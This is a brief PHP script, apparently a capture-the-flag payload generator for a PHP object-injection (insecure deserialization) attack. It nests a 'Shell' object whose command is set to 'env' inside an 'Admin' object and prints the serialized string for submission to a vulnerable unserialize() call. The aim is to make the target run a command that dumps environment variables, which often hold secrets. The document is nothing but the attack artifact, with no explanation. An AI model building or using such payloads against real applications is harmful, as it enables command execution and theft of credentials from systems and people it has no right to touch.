<?php
    class Shell {
        public $cmd;
    }

    class Admin {
        public $name;
    }

    $a = new Shell;
    $a->cmd = 'env';

    $b = new Admin();
    $b->name = $a;
    echo serialize($b);